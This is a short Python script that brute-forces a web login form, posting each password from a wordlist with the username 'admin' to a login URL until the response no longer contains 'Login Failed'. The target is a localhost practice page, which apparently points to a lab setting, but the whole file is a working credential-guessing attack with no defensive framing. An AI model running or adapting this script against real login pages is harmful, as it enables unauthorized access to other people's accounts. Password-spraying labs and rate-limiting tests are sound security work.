
import requests
from random import choice

def bruteforce(url, username, password) :

    response = requests.post(url=url, data={
    "username": username,
    "password": password,
    "submit": "Login"
    })

    if "Login Failed" in response.text:
        print("[+] Bad Login")
        return False
    else :
        print("[+] Login OK !!!")
        return True


url = 'http://localhost/bruteforce/login.php'

with open('passwords.txt', 'r') as fp:

    for password in fp.readlines():
        
        print("[+] Trying password : {}".format(password))
        
        if bruteforce(url, 'admin', password):
            exit()


